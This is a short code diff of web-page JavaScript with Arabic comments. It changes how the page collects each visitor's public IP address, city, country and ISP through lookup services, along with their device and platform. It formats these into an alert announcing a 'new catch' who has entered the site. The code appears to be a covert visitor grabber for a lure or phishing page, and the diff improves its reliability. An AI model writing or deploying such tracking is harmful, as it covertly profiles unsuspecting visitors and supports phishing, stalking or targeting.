@@ -74,22 +74,27 @@
             let ip = "Unknown";
             let locationInfo = "Unknown";
 
+            // جلب الـ IP الحقيقي بطريقة مضمونة جداً
             try {
-                let response = await fetch('https://ipapi.co/json/');
-                let data = await response.json();
-                ip = data.ip || "Unknown";
-                locationInfo = `${data.country_name || ''} - ${data.city || ''} (${data.org || ''})`;
+                let ipRes = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipRes.json();
+                ip = ipData.ip;
             } catch (err) {
-                try {
-                    let altRes = await fetch('https://api.ipify.org?format=json');
-                    let altData = await altRes.json();
-                    ip = altData.ip;
-                } catch(e) {}
+                ip = "Failed to fetch IP";
+            }
+
+            // محاولة جلب تفاصيل الدولة والشبكة بناءً على الـ IP
+            try {
+                let res = await fetch(`https://ipapi.co/${ip}/json/`);
+                let data = await res.json();
+                locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'} (${data.org || 'Unknown ISP'})`;
+            } catch (err) {
+                locationInfo = "Location unavailable";
             }
 
             let msg = `🚨 **[ صيد جديد دخل للموقع ]** 🚨\n\n` +
                       `📱 **الجهاز:** ${deviceName}\n` +
-                      `🌐 **الـ IP:** ${ip}\n` +
+                      `🌐 **الـ IP:** \`${ip}\`\n` +
                       `🏢 **الشبكة والموقع:** ${locationInfo}\n` +
                       `💻 **النظام:** ${navigator.platform}`;
             
